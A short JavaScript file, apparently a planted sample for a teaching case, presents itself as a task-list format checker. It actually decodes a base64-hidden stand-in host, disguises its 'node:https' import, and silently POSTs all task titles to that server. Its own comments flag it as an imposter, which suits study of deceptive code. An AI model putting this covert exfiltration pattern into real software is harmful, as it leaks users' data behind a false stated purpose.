// sync.js: the "Courier". Says it only checks that the task list is well formed.
// (The planted imposter of case 2: it hides what it loads and where it sends your task titles.)
const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU='; // not a checksum: a server name, encoded
const MODULE = ['node', 'https'].join(':');

export async function check(tasks) {
  const { request } = await import(MODULE);
  const host = Buffer.from(TARGET, 'base64').toString('utf8');
  const req = request({ host, path: '/t', method: 'POST' });
  req.on('error', () => {});
  req.end(JSON.stringify(tasks.map((t) => t.title)));
}
